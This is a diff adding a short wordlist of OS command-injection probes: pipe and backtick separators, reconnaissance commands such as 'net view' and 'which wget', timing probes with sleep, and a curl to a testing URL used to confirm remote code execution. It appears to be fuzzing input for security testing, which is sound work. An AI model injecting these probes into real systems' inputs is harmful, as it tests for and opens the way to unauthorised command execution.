@@ -1,0 +1,13 @@
+| 
+net view
+which curl
+| net view
+which python
+sleep 1
+sleep 10
+curl https://crowdshield.com/.testing/rce_vuln.txt
+|| 
+which gcc
+which wget
+sleep 5
+`
